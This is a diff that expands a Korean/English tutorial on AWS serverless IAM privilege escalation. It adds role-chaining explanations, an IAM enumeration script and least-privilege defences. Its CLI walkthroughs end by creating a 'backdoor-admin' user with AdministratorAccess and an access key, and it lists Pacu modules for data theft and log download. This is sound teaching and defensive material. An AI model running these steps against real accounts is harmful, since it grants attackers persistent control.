@@ -6,7 +6,147 @@
 
 # 서버리스 IAM 권한 남용 — 역할 체인·권한 상승·분석 CLI
 
-## 1. 서버리스 IAM 위협 모델
+## 1. IAM 기초 — 초보자를 위한 설명
+
+### IAM이란?
+
+IAM(Identity and Access Management)은 AWS에서 "누가 무엇을 할 수 있는가"를 제어하는 시스템이다.
+
+**비유:** 회사의 출입 카드 시스템과 같다.
+- **사용자(User)** = 직원 개인
+- **역할(Role)** = 직급/부서별 출입 권한 (개발자, 관리자, 읽기 전용)
+- **정책(Policy)** = 구체적인 접근 규칙 목록 (3층 개발실 출입 가능, 금고실 출입 불가)
+- **권한(Permission)** = 개별 규칙 하나하나
+
+```
+IAM 구성 요소 관계도
+
+AWS 계정
+    │
+    ├── 사용자 (IAM User)
+    │     - 장기 자격증명 (Access Key + Secret)
+    │     - 사람이 직접 사용
+    │
+    ├── 역할 (IAM Role)
+    │     - 임시 자격증명 (STS 토큰)
+    │     - Lambda, EC2 등 서비스가 사용
+    │     - 사람도 AssumeRole로 사용 가능
+    │
+    └── 정책 (IAM Policy)
+          - 역할/사용자에 부착
+          - Allow/Deny 규칙 목록
+          - 서비스:액션:리소스 형태
+```
+
+### IAM 정책 구조 이해
+
+```json
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",          ← Allow 또는 Deny
+      "Action": [                 ← 허용할 작업
+        "s3:GetObject",           ← S3에서 객체 읽기
+        "s3:PutObject"            ← S3에 객체 쓰기
+      ],
+      "Resource": [               ← 대상 리소스
+        "arn:aws:s3:::my-bucket/*"  ← my-bucket의 모든 객체
+      ],
+      "Condition": {              ← 조건 (선택적)
+        "StringEquals": {
+          "aws:RequestedRegion": "ap-northeast-2"
+        }
+      }
+    }
+  ]
+}
+```
+
+### Lambda IAM 역할이란?
+
+Lambda 함수가 AWS 서비스에 접근하려면 "실행 역할(Execution Role)"이 필요하다.
+
+```
+Lambda 함수 실행 흐름:
+
+사용자 요청
+    │
+    ▼
+Lambda 함수 시작
+    │
+    │ STS로 임시 자격증명 발급
+    │ (실행 역할의 권한)
+    ▼
+AWS 서비스 호출 (S3, DynamoDB 등)
+    │
+    ▼
+결과 반환
+
+함수가 s3:GetObject 권한이 없다면 → AccessDenied 오류
+```
+
+---
+
+## 2. AWS 권한 상승 경로 — 공격자 관점
+
+### 권한 상승이란?
+
+권한 상승(Privilege Escalation)은 낮은 권한으로 시작해 더 높은 권한을 획득하는 과정이다.
+
+**비유:** 주차장 직원이 주차 허가증만 있는데, 사무실 마스터키를 훔쳐 모든 층에 접근하는 것.
+
+```
+AWS IAM 권한 상승 경로 (25가지 이상)
+
+경로 1: PassRole + 서비스 활용
+  낮은 권한 → iam:PassRole → 높은 역할을 EC2/Lambda에 부착
+  → EC2/Lambda가 높은 권한으로 동작
+
+경로 2: CreatePolicyVersion
+  iam:CreatePolicyVersion → 새 버전에 AdministratorAccess 추가
+  → 기존 정책을 완전 권한으로 교체
+
+경로 3: AssumeRole
+  sts:AssumeRole → 더 높은 권한의 역할을 Assume
+  → 체인으로 여러 역할 연결 가능
+
+경로 4: Lambda 역할 탈취
+  lambda:InvokeFunction + lambda:GetFunctionConfiguration
+  → 높은 권한 Lambda의 실행 역할 자격증명 탈취
+
+경로 5: SetDefaultPolicyVersion
+  iam:SetDefaultPolicyVersion → 이미 존재하는 높은 권한 버전을 기본으로 설정
+```
+
+### AssumeRole 체인 공격 시각화
+
+```
+AssumeRole 체인 공격
+
+시작 (낮은 권한):
+  개발자 계정: s3:GetObject만 가능
+
+단계 1:
+  sts:AssumeRole → dev-cross-account-role
+  획득: S3 + DynamoDB 권한
+
+단계 2:
+  sts:AssumeRole → staging-admin-role
+  획득: 대부분의 서비스 관리 권한
+
+단계 3:
+  sts:AssumeRole → prod-deployer-role
+  획득: 프로덕션 환경 배포 권한
+
+최종:
+  iam:CreateUser + iam:AttachUserPolicy
+  → 새 관리자 계정 생성 → 영구 백도어
+```
+
+---
+
+## 3. 서버리스 IAM 위협 모델
 
 Lambda 함수에 과도한 IAM 권한이 부여되면 함수 코드 취약점 하나로 전체 AWS 계정을 장악할 수 있다.
 
@@ -20,7 +160,7 @@ Lambda 함수에 과도한 IAM 권한이 부여되면 함수 코드 취약점 �
 
 ---
 
-## 2. IAM 역할 분석
+## 4. IAM 역할 분석
 
 ```python
 #!/usr/bin/env python3
@@ -204,7 +344,7 @@ if __name__ == "__main__":
 
 ---
 
-## 3. STS AssumeRole 체인 공격
+## 5. STS AssumeRole 체인 공격
 
 ```python
 #!/usr/bin/env python3
@@ -277,7 +417,374 @@ def enumerate_assumable_roles(
 
 ---
 
-## 4. Lambda 역할 최소 권한 자동 생성
+## 6. AWS CLI로 AssumeRole 체인 공격 시연
+
+### 단계별 공격 흐름 (교육용)
+
+```bash
+# 사전 조건: 낮은 권한의 IAM 사용자 자격증명
+export AWS_ACCESS_KEY_ID="AKIA..."
+export AWS_SECRET_ACCESS_KEY="..."
+
+# 현재 신원 확인
+aws sts get-caller-identity
+# 출력:
+# {
+#   "UserId": "AIDAXXXXXXXXXXXXXXXXX",
+#   "Account": "123456789012",
+#   "Arn": "arn:aws:iam::123456789012:user/dev-user"
+# }
+
+# 1단계: dev-cross-account-role Assume (S3 + DynamoDB 권한)
+aws sts assume-role \
+    --role-arn "arn:aws:iam::123456789012:role/dev-cross-account-role" \
+    --role-session-name "pentest-session-1"
+
+# 반환된 임시 자격증명 설정
+export AWS_ACCESS_KEY_ID="ASIA..."       # 임시 키
+export AWS_SECRET_ACCESS_KEY="..."
+export AWS_SESSION_TOKEN="..."           # 세션 토큰 (임시 자격증명 표시)
+
+# 2단계: 더 높은 권한 역할 목록 확인
+aws iam list-roles --query 'Roles[*].RoleName' --output text
+
+# 3단계: staging-admin-role Assume
+aws sts assume-role \
+    --role-arn "arn:aws:iam::123456789012:role/staging-admin-role" \
+    --role-session-name "pentest-session-2"
+
+# 4단계: 최종 권한으로 관리자 계정 생성
+aws iam create-user --user-name backdoor-admin
+aws iam attach-user-policy \
+    --user-name backdoor-admin \
+    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
+aws iam create-access-key --user-name backdoor-admin
+```
+
+### 방어: AssumeRole에 조건 추가
+
+```json
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Principal": {
+        "AWS": "arn:aws:iam::123456789012:role/dev-role"
+      },
+      "Action": "sts:AssumeRole",
+      "Condition": {
+        "StringEquals": {
+          "sts:ExternalId": "unique-external-id-12345",
+          "aws:RequestedRegion": "ap-northeast-2"
+        },
+        "BoolIfExists": {
+          "aws:MultiFactorAuthPresent": "true"
+        }
+      }
+    }
+  ]
+}
+```
+
+---
+
+## 7. Lambda 실행 역할 남용 — Pacu 도구 사용
+
+### Pacu란?
+
+Pacu는 AWS 침투 테스트 프레임워크다. IAM 열거, 권한 상승, 데이터 탈취 모듈을 포함한다.
+
+```bash
+# Pacu 설치
+pip install pacu
+
+# Pacu 시작
+pacu
+
+# 자격증명 설정
+Pacu> set_keys
+
+# IAM 열거
+Pacu> run iam__enum_permissions
+
+# 권한 상승 경로 탐색
+Pacu> run iam__privesc_scan
+
+# Lambda 역할 탈취
+Pacu> run lambda__enum
+Pacu> run lambda__backdoor_new_roles
+
+# 결과 확인
+Pacu> data IAM
+```
+
+### 주요 Pacu 모듈
+
+| 모듈 | 설명 | 사용 시나리오 |
+|------|------|-------------|
+| `iam__enum_permissions` | 현재 권한 열거 | 초기 정찰 |
+| `iam__privesc_scan` | 권한 상승 경로 탐색 | 공격 경로 발견 |
+| `lambda__enum` | Lambda 함수 열거 | 공격 표면 파악 |
+| `s3__download_bucket` | S3 버킷 다운로드 | 데이터 탈취 |
+| `cloudtrail__download_event_history` | CloudTrail 로그 다운로드 | 활동 추적 회피 |
+
+---
+
+## 8. boto3 IAM 열거 스크립트
+
+```python
+#!/usr/bin/env python3
+"""AWS IAM 환경 종합 열거 도구 — 권한 상승 경로 탐색."""
+
+import argparse
+import json
+from dataclasses import dataclass, field
+from pathlib import Path
+import boto3
+from botocore.exceptions import ClientError
+
+
+@dataclass
+class IAMInventory:
+    """IAM 환경 인벤토리."""
+    current_identity: dict = field(default_factory=dict)
+    users: list[dict] = field(default_factory=list)
+    roles: list[dict] = field(default_factory=list)
+    groups: list[dict] = field(default_factory=list)
+    policies: list[dict] = field(default_factory=list)
+    privilege_escalation_paths: list[dict] = field(default_factory=list)
+
+
+# 권한 상승 가능한 액션 조합
+PRIVESC_PATHS = [
+    {
+        "name": "PassRole + Lambda",
+        "required": {"iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction"},
+        "description": "높은 권한 역할을 Lambda에 부착하여 코드 실행",
+    },
+    {
+        "name": "CreatePolicyVersion",
+        "required": {"iam:CreatePolicyVersion"},
+        "description": "기존 정책에 새 버전으로 AdministratorAccess 추가",
+    },
+    {
+        "name": "AssumeRole + AttachRolePolicy",
+        "required": {"sts:AssumeRole", "iam:AttachRolePolicy"},
+        "description": "역할 Assume 후 높은 권한 정책 부착",
+    },
+    {
+        "name": "CreateLoginProfile",
+        "required": {"iam:CreateLoginProfile", "iam:ListUsers"},
+        "description": "다른 사용자의 콘솔 패스워드 설정으로 계정 탈취",
+    },
+    {
+        "name": "SetDefaultPolicyVersion",
+        "required": {"iam:SetDefaultPolicyVersion"},
+        "description": "기존 정책의 높은 권한 버전을 기본으로 설정",
+    },
+]
+
+
+def get_current_identity(sts_client) -> dict:
+    """현재 자격증명 신원 확인."""
+    try:
+        return sts_client.get_caller_identity()
+    except ClientError as e:
+        return {"error": str(e)}
+
+
+def enumerate_roles_with_trust(iam_client) -> list[dict]:
+    """AssumeRole 가능한 역할 열거."""
+    roles = []
+    try:
+        paginator = iam_client.get_paginator("list_roles")
+        for page in paginator.paginate():
+            for role in page["Roles"]:
+                trust = role.get("AssumeRolePolicyDocument", {})
+                principals = []
+                for stmt in trust.get("Statement", []):
+                    p = stmt.get("Principal", {})
+                    if isinstance(p, dict):
+                        if "AWS" in p:
+                            principals.append(("AWS", p["AWS"]))
+                        if "Service" in p:
+                            principals.append(("Service", p["Service"]))
+                    elif isinstance(p, str):
+                        principals.append(("*", p))
+
+                roles.append({
+                    "RoleName": role["RoleName"],
+                    "RoleArn": role["Arn"],
+                    "Principals": principals,
+                    "CreateDate": str(role.get("CreateDate", "")),
+                })
+    except ClientError as e:
+        print(f"역할 열거 실패: {e}")
+    return roles
+
+
+def get_effective_permissions(iam_client, entity_type: str, entity_name: str) -> set[str]:
+    """사용자 또는 역할의 유효 권한 집합 반환."""
+    permissions: set[str] = set()
+
+    try:
+        if entity_type == "user":
+            # 인라인 정책
+            inline = iam_client.list_user_policies(UserName=entity_name)
+            for policy_name in inline.get("PolicyNames", []):
+                doc = iam_client.get_user_policy(
+                    UserName=entity_name, PolicyName=policy_name
+                )
+                permissions.update(extract_actions(doc["PolicyDocument"]))
+
+            # 관리형 정책
+            attached = iam_client.list_attached_user_policies(UserName=entity_name)
+            for policy in attached.get("AttachedPolicies", []):
+                actions = get_managed_policy_actions(iam_client, policy["PolicyArn"])
+                permissions.update(actions)
+
+        elif entity_type == "role":
+            inline = iam_client.list_role_policies(RoleName=entity_name)
+            for policy_name in inline.get("PolicyNames", []):
+                doc = iam_client.get_role_policy(
+                    RoleName=entity_name, PolicyName=policy_name
+                )
+                permissions.update(extract_actions(doc["PolicyDocument"]))
+
+            attached = iam_client.list_attached_role_policies(RoleName=entity_name)
+            for policy in attached.get("AttachedPolicies", []):
+                actions = get_managed_policy_actions(iam_client, policy["PolicyArn"])
+                permissions.update(actions)
+
+    except ClientError as e:
+        print(f"권한 조회 실패 ({entity_name}): {e}")
+
+    return permissions
+
+
+def get_managed_policy_actions(iam_client, policy_arn: str) -> set[str]:
+    """관리형 정책의 액션 목록."""
+    try:
+        policy = iam_client.get_policy(PolicyArn=policy_arn)
+        version_id = policy["Policy"]["DefaultVersionId"]
+        doc = iam_client.get_policy_version(PolicyArn=policy_arn, VersionId=version_id)
+        return extract_actions(doc["PolicyVersion"]["Document"])
+    except ClientError:
+        return set()
+
+
+def extract_actions(policy_doc: dict) -> set[str]:
+    """정책 문서에서 Allow 액션 추출."""
+    actions: set[str] = set()
+    for stmt in policy_doc.get("Statement", []):
+        if stmt.get("Effect") != "Allow":
+            continue
+        raw = stmt.get("Action", [])
+        if isinstance(raw, str):
+            raw = [raw]
+        actions.update(raw)
+    return actions
+
+
+def find_privesc_paths(permissions: set[str]) -> list[dict]:
+    """현재 권한으로 가능한 권한 상승 경로 탐색."""
+    paths = []
+    # 와일드카드 처리
+    has_all = "*" in permissions or "iam:*" in permissions
+
+    for path in PRIVESC_PATHS:
+        required = path["required"]
+        matched = required.issubset(permissions) or has_all
+        if matched:
+            paths.append({
+                "path": path["name"],
+                "description": path["description"],
+                "required_actions": list(required),
+            })
+
+    return paths
+
+
+def enumerate_iam_full(region: str = "ap-northeast-2") -> IAMInventory:
+    """전체 IAM 환경 열거."""
+    session = boto3.Session(region_name=region)
+    iam = session.client("iam")
+    sts = session.client("sts")
+
+    inventory = IAMInventory()
+
+    # 현재 신원
+    inventory.current_identity = get_current_identity(sts)
+    print(f"[*] 현재 신원: {inventory.current_identity.get('Arn', '알 수 없음')}")
+
+    # 역할 열거
+    print("[*] 역할 열거 중...")
+    inventory.roles = enumerate_roles_with_trust(iam)
+    print(f"    {len(inventory.roles)}개 역할 발견")
+
+    # 현재 신원의 권한 확인
+    arn = inventory.current_identity.get("Arn", "")
+    if ":user/" in arn:
+        entity_name = arn.split("/")[-1]
+        print(f"[*] 권한 열거: {entity_name}")
+        permissions = get_effective_permissions(iam, "user", entity_name)
+        inventory.privilege_escalation_paths = find_privesc_paths(permissions)
+
+    return inventory
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="AWS IAM 종합 열거")
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    enum_p = sub.add_parser("enumerate", help="전체 IAM 환경 열거")
+    enum_p.add_argument("--region", default="ap-northeast-2")
+    enum_p.add_argument("-o", "--output", type=Path)
+
+    privesc_p = sub.add_parser("privesc", help="권한 상승 경로 탐색")
+    privesc_p.add_argument("--entity-type", choices=["user", "role"], default="user")
+    privesc_p.add_argument("--entity-name", required=True)
+    privesc_p.add_argument("--region", default="ap-northeast-2")
+
+    args = parser.parse_args()
+
+    match args.cmd:
+        case "enumerate":
+            inventory = enumerate_iam_full(args.region)
+            print(f"\n[+] IAM 열거 완료")
+            print(f"    역할: {len(inventory.roles)}개")
+            if inventory.privilege_escalation_paths:
+                print(f"\n[!] 권한 상승 경로 발견 ({len(inventory.privilege_escalation_paths)}개):")
+                for path in inventory.privilege_escalation_paths:
+                    print(f"    [{path['path']}] {path['description']}")
+            if args.output:
+                data = {
+                    "identity": inventory.current_identity,
+                    "roles": inventory.roles,
+                    "privesc_paths": inventory.privilege_escalation_paths,
+                }
+                args.output.write_text(json.dumps(data, indent=2, default=str, ensure_ascii=False))
+
+        case "privesc":
+            iam = boto3.client("iam", region_name=args.region)
+            permissions = get_effective_permissions(iam, args.entity_type, args.entity_name)
+            paths = find_privesc_paths(permissions)
+            if paths:
+                print(f"[!] {len(paths)}개 권한 상승 경로:")
+                for p in paths:
+                    print(f"  [{p['path']}] {p['description']}")
+            else:
+                print("[+] 권한 상승 경로 없음")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 9. Lambda 역할 최소 권한 자동 생성
 
 ```python
 #!/usr/bin/env python3
@@ -403,7 +910,66 @@ if __name__ == "__main__":
 
 ---
 
-## 5. IAM 보안 모범 사례
+## 10. 일반적인 잘못 구성된 IAM 정책 예시
+
+### 나쁜 예 vs 좋은 예 비교
+
+```
+나쁜 예 1: 전체 S3 권한
+{
+  "Action": "s3:*",
+  "Resource": "*"
+}
+
+좋은 예 1: 특정 버킷만
+{
+  "Action": ["s3:GetObject", "s3:PutObject"],
+  "Resource": "arn:aws:s3:::my-specific-bucket/*"
+}
+
+---
+
+나쁜 예 2: AdministratorAccess 관리형 정책 사용
+{
+  "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+}
+
+좋은 예 2: 필요한 액션만
+{
+  "Action": [
+    "dynamodb:GetItem",
+    "dynamodb:PutItem",
+    "sqs:SendMessage"
+  ],
+  "Resource": [
+    "arn:aws:dynamodb:ap-northeast-2:123456789012:table/MyTable",
+    "arn:aws:sqs:ap-northeast-2:123456789012:MyQueue"
+  ]
+}
+
+---
+
+나쁜 예 3: IAM 관련 권한 무분별 부여
+{
+  "Action": ["iam:*", "sts:*"],
+  "Resource": "*"
+}
+
+좋은 예 3: 특정 역할 Assume만
+{
+  "Action": "sts:AssumeRole",
+  "Resource": "arn:aws:iam::123456789012:role/specific-readonly-role",
+  "Condition": {
+    "StringEquals": {
+      "sts:ExternalId": "known-external-id"
+    }
+  }
+}
+```
+
+---
+
+## 11. IAM 보안 모범 사례
 
 | 원칙 | 구현 |
 |------|------|
@@ -422,7 +988,147 @@ if __name__ == "__main__":
 
 # Serverless IAM Privilege Abuse — Role Chaining, Privilege Escalation, and Analysis CLI
 
-## 1. Serverless IAM Threat Model
+## 1. IAM Basics for Beginners
+
+### What Is IAM?
+
+IAM (Identity and Access Management) is the AWS system that controls "who can do what."
+
+**Analogy:** Think of a company's badge access system.
+- **User** = Individual employee
+- **Role** = Department-level access (developer, admin, read-only)
+- **Policy** = Specific access rule list (can enter 3rd floor dev room, cannot enter vault)
+- **Permission** = Each individual rule
+
+```
+IAM Component Relationships
+
+AWS Account
+    │
+    ├── IAM User
+    │     - Long-term credentials (Access Key + Secret)
+    │     - Used directly by humans
+    │
+    ├── IAM Role
+    │     - Temporary credentials (STS token)
+    │     - Used by Lambda, EC2, and other services
+    │     - Humans can use via AssumeRole
+    │
+    └── IAM Policy
+          - Attached to roles/users
+          - Allow/Deny rule list
+          - Service:Action:Resource format
+```
+
+### Understanding IAM Policy Structure
+
+```json
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",           <- Allow or Deny
+      "Action": [                  <- Actions to permit
+        "s3:GetObject",            <- Read objects from S3
+        "s3:PutObject"             <- Write objects to S3
+      ],
+      "Resource": [                <- Target resources
+        "arn:aws:s3:::my-bucket/*" <- All objects in my-bucket
+      ],
+      "Condition": {               <- Condition (optional)
+        "StringEquals": {
+          "aws:RequestedRegion": "ap-northeast-2"
+        }
+      }
+    }
+  ]
+}
+```
+
+### What Is a Lambda Execution Role?
+
+A Lambda function needs an "Execution Role" to access AWS services.
+
+```
+Lambda Function Execution Flow:
+
+User Request
+    │
+    ▼
+Lambda Function Starts
+    │
+    │ Issues temporary credentials via STS
+    │ (using execution role's permissions)
+    ▼
+Calls AWS Services (S3, DynamoDB, etc.)
+    │
+    ▼
+Returns Result
+
+If function lacks s3:GetObject permission → AccessDenied error
+```
+
+---
+
+## 2. AWS Privilege Escalation Paths — Attacker Perspective
+
+### What Is Privilege Escalation?
+
+Privilege escalation is the process of starting with low permissions and acquiring higher ones.
+
+**Analogy:** A parking attendant who has only a parking pass stealing the office master key to access all floors.
+
+```
+AWS IAM Privilege Escalation Paths (25+ known paths)
+
+Path 1: PassRole + Service Abuse
+  Low permission → iam:PassRole → Attach high-privilege role to EC2/Lambda
+  → EC2/Lambda operates with elevated permissions
+
+Path 2: CreatePolicyVersion
+  iam:CreatePolicyVersion → Add AdministratorAccess to new version
+  → Replace existing policy with full permissions
+
+Path 3: AssumeRole
+  sts:AssumeRole → Assume role with higher permissions
+  → Chain multiple roles for further escalation
+
+Path 4: Lambda Role Hijacking
+  lambda:InvokeFunction + lambda:GetFunctionConfiguration
+  → Steal execution role credentials from high-privilege Lambda
+
+Path 5: SetDefaultPolicyVersion
+  iam:SetDefaultPolicyVersion → Set existing high-privilege version as default
+```
+
+### AssumeRole Chain Attack Visualization
+
+```
+AssumeRole Chain Attack
+
+Start (low privilege):
+  Developer account: only s3:GetObject
+
+Step 1:
+  sts:AssumeRole → dev-cross-account-role
+  Gains: S3 + DynamoDB permissions
+
+Step 2:
+  sts:AssumeRole → staging-admin-role
+  Gains: Most service management permissions
+
+Step 3:
+  sts:AssumeRole → prod-deployer-role
+  Gains: Production environment deployment permissions
+
+Final:
+  iam:CreateUser + iam:AttachUserPolicy
+  → Create new admin account → Permanent backdoor
+```
+
+---
+
+## 3. Serverless IAM Threat Model
 
 When Lambda functions are granted excessive IAM permissions, a single code vulnerability can lead to full AWS account compromise.
 
@@ -436,14 +1142,14 @@ When Lambda functions are granted excessive IAM permissions, a single code vulne
 
 ---
 
-## 2. IAM Role Analysis
+## 4. IAM Role Analysis
 
 The Lambda IAM auditor connects to AWS and examines each Lambda function's execution role for dangerous permissions.
 
 **Risk classification:**
 - **CRITICAL**: Wildcard actions (`*`, `iam:*`, `s3:*`, etc.)
 - **HIGH**: 3 or more dangerous individual actions
-- **MEDIUM**: 1–2 dangerous individual actions
+- **MEDIUM**: 1-2 dangerous individual actions
 - **LOW**: No dangerous actions detected
 
 **Dangerous actions monitored** include privilege escalation actions (IAM user/policy manipulation, `iam:PassRole`), data exfiltration actions (`s3:GetObject`, `secretsmanager:GetSecretValue`, `kms:Decrypt`), and log tampering actions (`cloudtrail:DeleteTrail`, `logs:DeleteLogGroup`).
@@ -459,15 +1165,55 @@ python3 iam_auditor.py all --region us-east-1 --min-risk HIGH -o findings.json
 
 ---
 
-## 3. STS AssumeRole Chain Attack
+## 5. STS AssumeRole Chain Attack
 
 Role chaining is a privilege escalation technique where an attacker uses one role to assume another role with higher privileges. The `assume_role_chain()` function demonstrates chaining through multiple roles sequentially, using each set of credentials to assume the next role.
 
 The `enumerate_assumable_roles()` function discovers which roles the current identity can assume by examining each role's trust policy document for principal entries matching the current ARN or wildcard principals.
 
+### AWS CLI Role Chain Attack (Step-by-Step)
+
+```bash
+# Step 1: Check current identity (low privilege)
+aws sts get-caller-identity
+
+# Step 2: Assume first role
+aws sts assume-role \
+    --role-arn "arn:aws:iam::123456789012:role/dev-cross-account-role" \
+    --role-session-name "pentest-session-1"
+
+# Set temporary credentials
+export AWS_ACCESS_KEY_ID="ASIA..."
+export AWS_SECRET_ACCESS_KEY="..."
+export AWS_SESSION_TOKEN="..."
+
+# Step 3: Assume second (higher privilege) role
+aws sts assume-role \
+    --role-arn "arn:aws:iam::123456789012:role/staging-admin-role" \
+    --role-session-name "pentest-session-2"
+
+# Step 4: Create backdoor admin account with final privileges
+aws iam create-user --user-name backdoor-admin
+aws iam attach-user-policy \
+    --user-name backdoor-admin \
+    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
+```
+
 ---
 
-## 4. Automated Least Privilege Policy Generation
+## 6. Common Misconfigured IAM Policies
+
+| Bad Pattern | Risk | Better Alternative |
+|-------------|------|--------------------|
+| `"Action": "s3:*"` | Full S3 access | Specific s3:GetObject, s3:PutObject |
+| `AdministratorAccess` managed policy | Full account access | Custom least-privilege policy |
+| `"Resource": "*"` everywhere | Affects all resources | Specific ARNs per resource |
+| `"iam:*"` permission | Create/delete any IAM entity | Remove entirely or scope tightly |
+| No conditions on AssumeRole | Any principal can assume | Add ExternalId, MFA condition |
+
+---
+
+## 7. Automated Least Privilege Policy Generation
 
 The policy generator parses Lambda function Python source code using the `ast` module to identify `boto3.client()` and `boto3.resource()` calls, then maps the detected service names and method calls to the minimum required IAM actions.
 
@@ -498,7 +1244,7 @@ python3 policy_generator.py ./lambda_src/ -o minimum_policy.json
 
 ---
 
-## 5. IAM Security Best Practices
+## 8. IAM Security Best Practices
 
 | Principle | Implementation |
 |-----------|---------------|
@@ -510,3 +1256,21 @@ python3 policy_generator.py ./lambda_src/ -o minimum_policy.json
 | Temporary Credentials | Use STS temporary tokens instead of long-term credentials |
 | SCP | Use AWS Organization SCPs as account-level guardrails |
 | Access Analyzer | Use IAM Access Analyzer to detect external access |
+
+---
+
+## 9. boto3 IAM Enumeration Script Summary
+
+The full IAM enumeration script (`enumerate_iam_full`) performs:
+1. Identity discovery via `sts:GetCallerIdentity`
+2. Role enumeration with trust policy analysis
+3. Effective permission collection (inline + managed policies)
+4. Privilege escalation path detection against 5+ known paths
+5. JSON report output for further analysis
+
+Key privilege escalation paths detected:
+- PassRole + Lambda/EC2 service abuse
+- CreatePolicyVersion (backdoor via new policy version)
+- AssumeRole + AttachRolePolicy chain
+- CreateLoginProfile (account takeover)
+- SetDefaultPolicyVersion (enable dormant high-privilege version)
